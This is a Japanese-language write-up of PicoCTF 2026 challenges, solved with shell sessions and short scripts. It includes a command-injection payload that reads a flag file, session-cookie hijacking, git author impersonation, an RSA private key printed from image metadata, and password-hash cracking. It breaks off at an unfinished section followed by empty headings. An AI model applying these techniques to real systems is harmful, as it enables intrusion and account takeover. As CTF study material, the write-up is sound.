# PicoCTF 2026 Writeup

## Undo (General Skills; Easy)

文字列変換系のコマンドを示すだけで OK

```shell
$ nc foggy-cliff.picoctf.net 61626
===Welcome to the Text Transformations Challenge!===

Your goal: step by step, recover the original flag.
At each step, you'll see the transformed flag and a hint.
Enter the correct Linux command to reverse the last transformation.

--- Step 1 ---
Current flag: KTBxcDI0bnIwLWZhMDFnQHplMHNmYTRlRy1nazNnLXRhMWZlcmlyRShTR1BicHZj
Hint: Base64 encoded the string.
Enter the Linux command to reverse it: base64 -d
Correct!

--- Step 2 ---
Current flag: )0qp24nr0-fa01g@ze0sfa4eG-gk3g-ta1ferirE(SGPbpvc
Hint: Reversed the text.
Enter the Linux command to reverse it: rev
Correct!

--- Step 3 ---
Current flag: cvpbPGS(Eriref1at-g3kg-Ge4afs0ez@g10af-0rn42pq0)
Hint: Replaced underscores with dashes.
Enter the Linux command to reverse it: tr '-' '_'
Correct!

--- Step 4 ---
Current flag: cvpbPGS(Eriref1at_g3kg_Ge4afs0ez@g10af_0rn42pq0)
Hint: Replaced curly braces with parentheses.
Enter the Linux command to reverse it: tr '()' '{}'
Correct!

--- Step 5 ---
Current flag: cvpbPGS{Eriref1at_g3kg_Ge4afs0ez@g10af_0rn42pq0}
Hint: Applied ROT13 to letters.
Enter the Linux command to reverse it: tr 'A-Za-z' 'N-ZA-Mn-za-m'
Correct!

Congratulations! You've recovered the original flag:
>>> picoCTF{Revers1ng_t3xt_Tr4nsf0rm@t10ns_0ea42cd0}

```

Flag: `picoCTF{Revers1ng_t3xt_Tr4nsf0rm@t10ns_0ea42cd0}`

## MY GIT (General Skills; Easy)

まずは調査

```shell
$ git clone ssh://git@foggy-cliff.picoctf.net:55822/git/challenge.git
(snip)

$ cd challenge

$ cat README.md
# MyGit

### If you want the flag, make sure to push the flag!

Only flag.txt pushed by ```root:root@picoctf``` will be updated with the flag.

GOOD LUCK!
```

root:root@picoctf としてコミットすれば良さそう。
表示名 `root`, Eメールアドレス `root@picoctf` としてコミットを生成すればいい

```shell
$ touch flag.txt

$ git add flag.txt

$ git commit --author "root <root@picoctf>" -m "cmt"
[master cebc1d7] cmt
 Author: root <root@picoctf>
 1 file changed, 0 insertions(+), 0 deletions(-)
 create mode 100644 flag.txt

$ git push
(snip)
remote: Author matched and flag.txt found in commit...
remote: Congratulations! You have successfully impersonated the root user
remote: Here's your flag: picoCTF{1mp3rs0n4t4_g17_345y_02a39618}
(snip)
```

Flag: `picoCTF{1mp3rs0n4t4_g17_345y_02a39618}`

## bytemancy 1 (General Skills; Easy)

```plain
$ nc foggy-cliff.picoctf.net 64407
⊹──────[ BYTEMANCY-1 ]──────⊹
☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐

Send me ASCII DECIMAL 101 1751 times, side-by-side, no space.

☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐
⊹─────────────⟡─────────────⊹
==>
```

ASCII コード 101 (`e`) を 1751 回繰り返したものを送信したい。
`printf`, `tr` で 1751 個の `e` を生成して送信する。

```shell
$ printf "%1751c\n" " " | tr " " "e" | nc foggy-cliff.picoctf.net 64407
⊹──────[ BYTEMANCY-1 ]──────⊹
☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐

Send me ASCII DECIMAL 101 1751 times, side-by-side, no space.

☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐
⊹─────────────⟡─────────────⊹
==> picoCTF{h0w_m4ny_e's???_e0d51f4b}
```

Flag: `picoCTF{h0w_m4ny_e's???_e0d51f4b}`

## Printer shares 1 (General Skills; Easy)

smbclient で接続すると、`shares` なる共有があり、その下に `flag.txt` がある。
このファイルの中身がフラグとなっているので、ダウンロードして `cat` する。

```plain
$ nix-shell -p samba

[nix-shell]$ smbclient -p 61421 '\\mysterious-sea.picoctf.net\shares'
Can't load /etc/samba/smb.conf - run testparm to debug it
Password for [WORKGROUP\syoch]: (適当になんか入力する)
Try "help" to get a list of possible commands.
smb: \> get flag.txt
getting file \flag.txt of size 37 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> exit

[nix-shell]$ cat flag.txt
picoCTF{5mb_pr1nter_5h4re5_8a0df8e0}
```

Flag: `picoCTF{5mb_pr1nter_5h4re5_8a0df8e0}`

## ping-cmd (General Skills; Easy)

典型的なコマンドインジェクションの問題。
ping 対象 IP アドレスのサニタイズがサれていないので、`;` でコマンドを区切って `cat ~/flag.txt` を実行させる。

```plain
❯ nc mysterious-sea.picoctf.net 61548
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; cat ~/flag.txt
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=8.37 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=8.35 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 8.346/8.357/8.368/0.011 ms
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_17ae04f2}
```

Flag: `picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_17ae04f2}`

## bytemancy 0 (General Skills; Easy)

app.py:10 あたりの記述から `eee` を送信すればいいとわかる。

```py
    user_input = input('==> ')
    if user_input == "\x65\x65\x65":
```

```shell
❯ echo "eee" | nc candy-mountain.picoctf.net 65136
⊹──────[ BYTEMANCY-0 ]──────⊹
☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐

Send me ASCII DECIMAL 101, 101, 101, side-by-side, no space.

☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐
⊹─────────────⟡─────────────⊹
==> picoCTF{pr1n74813_ch4r5_334c472c}
```

Flag: `picoCTF{pr1n74813_ch4r5_334c472c}`

## Piece by Piece (General Skills; Easy)

```plain
$ ssh -p 58358 ctf-player@dolphin-cove.picoctf.net
ctf-player@pico-chall$ cat part* > part
ctf-player@pico-chall$ unzip part
Archive:  part
[part] flag.txt password:
 extracting: flag.txt
ctf-player@pico-chall$ cat flag.txt
picoCTF{z1p_and_spl1t_f1l3s_4r3_fun_78b76e61}
```

Flag: `picoCTF{z1p_and_spl1t_f1l3s_4r3_fun_78b76e61}`

## Old sessions (Web Exploitation; Easy)

サイトアクセス時、Login/Register のページが表示される。
適当なユーザ名とパスワードでアカウントを作成する。
その後、作成したアカウントでログインすると、コメント欄のあるページが表示される。

コメント欄で `Hey I found a strange page at /sessions` と呟かれているので、`/sessions` にアクセスする。

```plain
1) session:5NI1PaoxhVaGtE613F4kZcwnjdv2b6geVNkIGQ_9M9o, {'_permanent': True, 'key': 'admin'}
2) session:jlIhWaKd7q2hNxQuuyZDy20_PwBQMR0rtY8DWxjrP0Q, {'_permanent': True, 'key': 'a'}
```

上記の結果から、`session:5NI1PaoxhVaGtE613F4kZcwnjdv2b6geVNkIGQ_9M9o` が admin 権限を持つセッションであることがわかる。
自分の Cookie `session` を見ると (2) の値がセットされているので、これを (1) の値に書き換えて、トップページをリロードする。

`Welcome admin` の後にフラグが表示される。

Flag: `picoCTF{s3t_s3ss10n_3xp1rat10n5_10f20509}`

## Quizploit (Binary Exploitation; Easy)

```shell
$ file vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=19251d430d5dd4b44a3e8489a8c76f1894676f7d, for GNU/Linux 3.2.0, not stripped
```

`nc` で問題サーバーに接続すると以下の問が示される。

1. Is this a '32-bit' or '64-bit' ELF? (e.g. 100-bit) (答え: 64-bit)
1. What's the linking of the binary? (e.g. static, dynamic) (答え: dynamic)
1. Is the binary 'stripped' or 'not stripped'? (答え: not stripped)
1. Looking at the vuln() function, what is the size of the buffer in bytes? (e.g. 0x10) (答え: 0x15)
1. How many bytes are read into the buffer? (e.g. 0x10) (答え: 0x90)
1. Is there a buffer overflow vulnerability? (yes/no) (答え: yes)
1. Name a standard C function that could cause a buffer overflow in the provided C code. (答え: fgets)
1. What is the name of function which is not called any where in the program? (答え: win)
1. What type of attack could exploit this vulnerability? (e.g. format string, buffer overflow, etc.) (答え: buffer overflow)
1. How many bytes of overflow are possible? (e.g. 0x10) (答え: 0x7b)
1. What protection is enabled in this binary? (答え: NX)
1. What exploitation technique could bypass NX? (e.g. shellcode, ROP, format string) (答え: ROP)
1. What is the address of 'win()' in hex? (e.g. 0x4011eb) (答え: 0x401176)

Flag: `picoCTF{my_bIn@4y_3xpl0it_fL@g_0235704f}`

## StagoRSA (Cryptography; Easy)

とりあえず、与えられた画像ファイルの metadata を読んでみる

```shell
$ exiftool image.jpg
ExifTool Version Number         : 13.52
File Name                       : image.jpg
Directory                       : .
File Size                       : 21 kB
File Modification Date/Time     : 2026:03:12 16:35:09+09:00
File Access Date/Time           : 2026:07:04 06:50:30+09:00
File Inode Change Date/Time     : 2026:03:12 16:35:17+09:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Comment                         : 2d2d2d2d2d424547494e2050524956415445204b45592d2d2d2d2d0a4d494945764149424144414e42676b71686b6947397730424151454641415343424b59776767536941674541416f4942415144524437397174736a377751714b0a41584b2f634f36456c43664c48303071374544316d56736f6247416e5a6c3036304f596275616a5a76666d45566b6c515466363330326f6c3170586b794e524b0a57594b7531323145447971475a58676f6a704b43747a2b77525a4d797433756e6349424f49464f4e63374745774e33725545386b42745148736c4a4331724d340a74355953375330784d70665a7a552f784c49756d55474d45412f55372f62566a6e705a6b56636c426a4c6d384d676579436b434b4632776745514f50734b4b660a3531516a4739413168784549775866596241437955742f41366559614e76683541416851396868674f676d50476d6a37394f4c64363774373161464e2f6b594c0a335a4f47694b4f6368426347776349364b78306a33614f5a7975394f3331646d784d6a654d76522b345441426f64373068352b5467642b344c63386e613155630a524c76625235764641674d4241414543676745414652556964342b4253796f58647631595a6766736463412f4678504d4132555a302b716f4c375a6d4a2f4d420a75646d784b75435a4c345168386e2b46477930535839565a49674732306743537341444131674c78694f69436f4655425067334b707058325054393237616c6c0a4e656835642b6434705934694f38483758797956486f7631752b5432754c6a5145417372666a4d65324a52436a6674506359484e66334d6832526a52465542380a35737966724370482b446243734f7064527a774b726757544e6d377261653238305470536e4545674856524b6d7234785a36336a7a37686a323738443453784a0a7169423143695531334c52433559395072792f716e77664e41663844317879696f6b4454734b492f786f6f73545536514958794b656c305039724233576a76530a475a565354674161794d70364c4e514b6631303674516f315573462f6331533366417262566e6f5851514b42675144664f647472686e3176586b4856683165660a74546f6b434d5566712f42444b44433337706564465158722f384865576a6f693650374c304f536a62486352376c2f6e497445504138704870434a6a6e4267620a6332387247502f365830707855794c3770473449566c394f73537770656544656e617a4d667566464735484330775652702b4e38356f42692b564e65313579750a664249343237757547706171457837653032477551656c6a45514b4267514476775947494d41454569517a68576b54686f5a5259736d3137534c4e6f6a7836700a736c416c764d7031776a386a64534752725546307031483573306268426954345941356b4a6578414e3744774e68634f4c7149372b566f522f34652f442f4c6a0a3447306243455247684a3639347a6c68757846756f5162364d73417a3275615a4d63422b46416b6d5470345753317a666462675076307246464e4c6e734e76370a6975712f4a63344664514b4267413147436e63645779345a49373848756a306a384a346436324c547659697778687a5a3069676b444f4d597054574d6c664a6e0a656d63794e375a454239794947536e4d567a5157584a766639612b496f364a575065454a4c6f64377a5268714169574768496834596c68796a706130795a74540a4d75684344355158374a58794b466e5071755a4e616f7234476d34455569764a387564776f58746231324f726d5756556d6e56624d2f3652416f4741546548560a4778464538313031777571593335616d597432724e4e59622b5959735673476d7957743364534e6863546f32616d55576b7a64624b4c7230396c6f526e6d464e0a713369714d76346b53784f3344354e5566686a31436b32776f66386a5471547a72456c574c4859655074375749416f746b6e74616b6548306a364f334c754a370a666a6b78383743734a392f5a546e6d6d4465393838574a66564959654836737a734634756535554367594152496e7a514e71475a69306c3253385232506f41340a3057515467474a4539434b316c686a537869374a68523232626878585a4a746c5163556276436c727147586f55353249706c325a563933355a3167676877522f0a5169596b454b7a65534d6e56564a6d377a454a7159424a5435644139655754754135794448615676682f683369366159703243464f4c4169526c6437723653760a4e31706868315a457235792b624d55656652524c4e673d3d0a2d2d2d2d2d454e442050524956415445204b45592d2d2d2d2d0a
Image Width                     : 512
Image Height                    : 512
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 512x512
Megapixels                      : 0.262
```

コメントの先頭 5 バイトが `2d2d2d2d2d` で、これは ASCII 文字列 '-----' に対応する。
実際、 Python3 の `bytes.fromhex(...)` で復元すると以下の様に、秘密鍵を得られる。
```
-----BEGIN PRIVATE KEY-----
MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQDRD79qtsj7wQqK
AXK/cO6ElCfLH00q7ED1mVsobGAnZl060OYbuajZvfmEVklQTf6302ol1pXkyNRK
WYKu121EDyqGZXgojpKCtz+wRZMyt3uncIBOIFONc7GEwN3rUE8kBtQHslJC1rM4
t5YS7S0xMpfZzU/xLIumUGMEA/U7/bVjnpZkVclBjLm8MgeyCkCKF2wgEQOPsKKf
51QjG9A1hxEIwXfYbACyUt/A6eYaNvh5AAhQ9hhgOgmPGmj79OLd67t71aFN/kYL
3ZOGiKOchBcGwcI6Kx0j3aOZyu9O31dmxMjeMvR+4TABod70h5+Tgd+4Lc8na1Uc
RLvbR5vFAgMBAAECggEAFRUid4+BSyoXdv1YZgfsdcA/FxPMA2UZ0+qoL7ZmJ/MB
udmxKuCZL4Qh8n+FGy0SX9VZIgG20gCSsADA1gLxiOiCoFUBPg3KppX2PT927all
Neh5d+d4pY4iO8H7XyyVHov1u+T2uLjQEAsrfjMe2JRCjftPcYHNf3Mh2RjRFUB8
5syfrCpH+DbCsOpdRzwKrgWTNm7rae280TpSnEEgHVRKmr4xZ63jz7hj278D4SxJ
qiB1CiU13LRC5Y9Pry/qnwfNAf8D1xyiokDTsKI/xoosTU6QIXyKel0P9rB3WjvS
GZVSTgAayMp6LNQKf106tQo1UsF/c1S3fArbVnoXQQKBgQDfOdtrhn1vXkHVh1ef
tTokCMUfq/BDKDC37pedFQXr/8HeWjoi6P7L0OSjbHcR7l/nItEPA8pHpCJjnBgb
c28rGP/6X0pxUyL7pG4IVl9OsSwpeeDenazMfufFG5HC0wVRp+N85oBi+VNe15yu
fBI427uuGpaqEx7e02GuQeljEQKBgQDvwYGIMAEEiQzhWkThoZRYsm17SLNojx6p
slAlvMp1wj8jdSGRrUF0p1H5s0bhBiT4YA5kJexAN7DwNhcOLqI7+VoR/4e/D/Lj
4G0bCERGhJ694zlhuxFuoQb6MsAz2uaZMcB+FAkmTp4WS1zfdbgPv0rFFNLnsNv7
iuq/Jc4FdQKBgA1GCncdWy4ZI78Huj0j8J4d62LTvYiwxhzZ0igkDOMYpTWMlfJn
emcyN7ZEB9yIGSnMVzQWXJvf9a+Io6JWPeEJLod7zRhqAiWGhIh4Ylhyjpa0yZtT
MuhCD5QX7JXyKFnPquZNaor4Gm4EUivJ8udwoXtb12OrmWVUmnVbM/6RAoGATeHV
GxFE8101wuqY35amYt2rNNYb+YYsVsGmyWt3dSNhcTo2amUWkzdbKLr09loRnmFN
q3iqMv4kSxO3D5NUfhj1Ck2wof8jTqTzrElWLHYePt7WIAotkntakeH0j6O3LuJ7
fjkx87CsJ9/ZTnmmDe988WJfVIYeH6szsF4ue5UCgYARInzQNqGZi0l2S8R2PoA4
0WQTgGJE9CK1lhjSxi7JhR22bhxXZJtlQcUbvClrqGXoU52Ipl2ZV935Z1gghwR/
QiYkEKzeSMnVVJm7zEJqYBJT5dA9eWTuA5yDHaVvh/h3i6aYp2CFOLAiRld7r6Sv
N1phh1ZEr5y+bMUefRRLNg==
-----END PRIVATE KEY-----
```

後はこれを使って、flag.enc を `openssl` で復号化する。

```shell
$ openssl rsautl -decrypt -inkey private.pem -in flag.enc -out flag.txt

$ cat flag.txt
picoCTF{rs4_k3y_1n_1mg_0a64c2f9}
```

Flag: `picoCTF{rs4_k3y_1n_1mg_0a64c2f9}`

## Shared Secrets (Cryptography; Easy)

ソースコード (`encryption.py`) を読むと、以下のような体系の暗号であることがわかる

- g = 2 (既知)
- p = 1048 bit の素数 (既知)
- a = 2, p-2 の間の整数
- A = g^a mod p (既知)
- b = ? (既知)
- B = g^b mod p

- shared = A^b mod p
- 暗号化: shared % 256 でバイトごとに xor する

問題より、暗号文は既知なので、`shared` を特定したい。
`shared` は `A`, `B`, `p` で求めることができるので、素直に xor し直せばフラグが得られる。

```python
with open("message.txt", "r") as f:
    lines = f.read().splitlines()
    g = int(lines[0].split(" = ")[1])
    p = int(lines[1].split(" = ")[1])
    A = int(lines[2].split(" = ")[1])
    b = int(lines[3].split(" = ")[1])
    enc = bytes.fromhex(lines[4].split(" = ")[1])

shared = pow(A, b, p)

flag = bytes([x ^ (shared % 256) for x in enc])
print(flag.decode())
```

```shell
$ python3 solve.py
picoCTF{dh_s3cr3t_9982ffe6}
```

Flag: `picoCTF{dh_s3cr3t_9982ffe6}`

## Password Profiler (General Skills; Easy)

`userinfo.txt` の情報を元に、cupp でパスワードリストを生成する。

```shell
❯ python3 cupp.py -i
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Alice
> Surname: Johnson
> Nickname: AJ
> Birthdate (DDMMYYYY): 15071990


> Partners) name: Bob
> Partners) nickname:
> Partners) birthdate (DDMMYYYY):


> Child's name: Charlie
> Child's nickname:
> Child's birthdate (DDMMYYYY):


> Pet's name:
> Company name:


> Do you want to add some key words about the victim? Y/[N]:
> Do you want to add special chars at the end of words? Y/[N]:
> Do you want to add some random numbers at the end of words? Y/[N]:
> Leet mode? (i.e. leet = 1337) Y/[N]:

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to alice.txt, counting 5180 words.
> Hyperspeed Print? (Y/n) : n
[+] Now load your pistolero with alice.txt and shoot! Good luck!
```

生成された `alice.txt` を使って、 Python3 で SHA1 ハッシュが一致するものを探して、PicoCTF のフラグフォーマットに整えればフラグが得られる。

```python
import hashlib

HASH_FILE = "hash.txt"
WORDLIST_FILE = "alice.txt"  # wordlist that was generated using CUPP


def load_hash():
    with open(HASH_FILE, "r") as f:
        return f.read().strip()


def crack_password(target_hash: str):
    with open(WORDLIST_FILE, "r") as f:
        for password in f:
            password = password.strip()
            if hashlib.sha1(password.encode()).hexdigest() == target_hash:
                return password
    return None


if __name__ == "__main__":
    target_hash = load_hash()
    result = crack_password(target_hash)
    if result:
        print(f"Password found: picoCTF{{{result}}}")
    else:
        print("No match found.")
```

```shell
$ python3 check_password.py
Password found: picoCTF{Aj_15901990}
```

Flag: `picoCTF{Aj_15901990}`

## MultiCode (General Skills; Easy)

`message.txt` の内容を見て順次適切に復元していく

```plain
$ cat message.txt
NjM3NjcwNjI1MDQ3NTMyNTM3NDI2MTcyNjY2NzcyNzE1ZjcyNjE3MDMwNzE3NjYxNzQ1ZjM4NzE3MTMwMzM3MjczNzIyNTM3NDQ=
```

From Base64, From Hex, URL Decode, ROT13 の順番で復元すればいい。
今回は [CyberChef](https://gchq.github.io/CyberChef) を使った

Flag: `picoCTF{nested_enc0ding_8dd03efe}`

## Binary Digits (Forensics; Easy)

`digits.bin` が 2 進数の羅列なので、適当に Python3 でバイト列に復元する。

```python
import sys

data = sys.stdin.buffer.read()

content = b""
for i in range(0, len(data), 8):
    byte = data[i : i + 8]
    content += bytes([int(byte, 2)])

sys.stdout.buffer.write(content)
```

```shell
# ここでは flag.jpg に保存しているが、別のファイル名でも良い
$ \cat digits.bin | python3 solve.py > flag.jpg

```

`flag.jpg` を開くとフラグが表示されるので、それを提出すれば OK

Flag: `picoCTF{h1dd3n_1n_th3_b1n4ry_d4e39e9e}`

## Secure Password Database (Reverse Engineering; Medium)

Reverse Engineering 問題だが、if 分を通過する条件を満たす入力を計算するのが面倒なので、 `gdb` で条件を満たす値を直接取得してしまう。

以下の分岐があるので、フラグを得る分岐に入るための `hash` と `pw_hash` の値を取得する。

```asm
                             int main()
                            (snip)
                             main
        001013d0                 ENDBR64
        (snip)
        0010167e                 MOV        RAX,qword ptr [RBP + hash]
        00101685                 CMP        RAX,qword ptr [RBP + pw_hash]
        0010168c                 JNZ        LAB_0010172a
```

試しにパスワードを空文字列にし、`0` 文字入力したことにして、ハッシュとして `99` を入力してみる

```gdb
(gdb) ni
0x0000555555555685 in main ()
1: x/4i $pc
=> 0x555555555685 <main+693>:	cmp    -0xf8(%rbp),%rax
   0x55555555568c <main+700>:	jne    0x55555555572a <main+858>
   0x555555555692 <main+706>:	lea    0xa60(%rip),%rax        # 0x5555555560f9
   0x555555555699 <main+713>:	mov    %rax,%rsi
(gdb) p $rax
$3 = -3209081493549540382
(gdb) p {int}($rbp - 0xf8)
$4 = 99
```

となり `-3209081493549540382` を入力すれば、フラグを得る分岐に入れそう。
実際に分岐に入るか検証する

```shell
$ ./system.out
Please set a password for your account:

How many bytes in length is your password?
0
You entered: 0
Your successfully stored password:
10
Enter your hash to access your account!
-3209081493549540382
Could not open flag.txt: No such file or directory
```

後はこれをサーバー上で実行すれば、フラグを得られる。

```python
from pwn import tube
from syoch_ctf.pwn import auto_solver


@auto_solver(
    local_executable="./system.out",
    remote_host="candy-mountain.picoctf.net",
    remote_port=52914,
)
def solve(p: tube):
    p.sendline(b"")
    p.sendline(b"0")
    p.sendline(b"-3209081493549540382")
    p.interactive()

    return "SolverSuccess"
```

```shell
$ python3 solve.py
[+] Opening connection to candy-mountain.picoctf.net on port 52914: Done
[DEBUG] Sent 0x1 bytes:
    b'\n'
[DEBUG] Sent 0x2 bytes:
    b'0\n'
[DEBUG] Sent 0x15 bytes:
    b'-3209081493549540382\n'
[*] Switching to interactive mode
[DEBUG] Received 0x55 bytes:
    b'Please set a password for your account:\r\n'
    b'How many bytes in length is your password?\r\n'
Please set a password for your account:
How many bytes in length is your password?
[DEBUG] Received 0x7d bytes:
    b'You entered: 0\r\n'
    b'Your successfully stored password:\r\n'
    b'10 \r\n'
    b'Enter your hash to access your account!\r\n'
    b'picoCTF{d0nt_trust_us3rs}\r\n'
You entered: 0
Your successfully stored password:
10
Enter your hash to access your account!
picoCTF{d0nt_trust_us3rs}
[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Closed connection to candy-mountain.picoctf.net port 52914
```

Flag: `picoCTF{d0nt_trust_us3rs}`

## No FA (Web Exploitation; Medium)

ソースコード (`app.py`) を読むとユーザ名が admin であるセッションのときにフラグを得られそう
リークした DB (`users.db`) を読んで admin の情報を調べてみる

```shell
$ nix run nixpkgs\#sqlite -- ./users.db
SQLite version 3.51.2 2026-01-09 17:27:48
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> .schema users
CREATE TABLE users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                email TEXT NOT NULL,
                password TEXT NOT NULL,
                two_fa BOOLEAN NOT NULL DEFAULT 0
            );
sqlite> select password from users where username = 'admin';
c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67
```

ソースコードを見る感じ、 Salt なしっぽいので [crackstation](https://crackstation.net) でルックアップすると、パスワード `apple@123` がわかる。

次に OTP の入力を求められる。
生成された OTP は Flask のセッション情報に埋め込まれてそうなので、適当なデコーダーを使って中身を取る (ここでは [Flask Session Cookie Decoder](https://www.kirsle.net/wizards/flask-session.cgi) を使った。)

```json
{
    "logged": "false",
    "otp_secret": "9461",
    "otp_timestamp": 1783174703.0605233,
    "username": "admin"
}
```

`otp_secret` フィールドの値を使ってログインすれば Flag を得られる。

Flag: `picoCTF{n0_r4t3_n0_4uth_3e4cf476}`

## Bypass Me (Reverse Engineering; Medium)

まずは SSH 経由で、bypassme.bin をダウンロードする

```shell
$ scp -P 53115 ctf-player@foggy-cliff.picoctf.net:bypassme.bin .
(snip)

```
$ ldd bypassme.bin
	/lib64/ld-linux-x86-64.so.2 (0x7e7c60d52000)
	libc.so.6 => /lib64/ld-linux-x86-64.so.2 (0x7e7c60d52000)
```

bypassme.bin は `strcmp` 関数を含み動的リンクされているので `LD_PRELOAD` で `strcmp` を適当にフックする。```

## offset-cycle

## offset-cycle-v2

## bytemancy 2

## Printer shares 2

## Printer shares 3

## Auto rev 1

## Forensics Git2

## Forensics Git 1

## Forensics Git 0

## KSECRETS

## North-South

## チャットみたいなやつ

## Secret Box

## Sql Map1

## ORDER ORDER

## Black Cobra Pepper

## Hidden Cipher 2

## Echo Escape 2

## Hashgate

## Silent Stream

## Fool the Lockout

## ClusterRSA

## Binary Instrumentation 3

## Small Trouble

## Binary Instrumentation 4

## bytemancy 3

## Secure Dot Product

## Echo Escape 1

## Timeline1

## Forensics Git 2

## Forensics Git 0

## Timestamped Secrets

## Secret Box

## MSS_ADVANCE Revenge

## The Add-On Trap

## No FA

## Related Messages

## paper-2

## Hidden Cipher1

## gatekeeper

## JITFP

## Timeline0

## Quizploit

## shift registers

## cryptomaze

## tea-cash

## StegoRSA

## Forensics Git 1

## Access_Control

## Heap Havoc

## Credential Stuffing

## DISKO4

## Failure Failure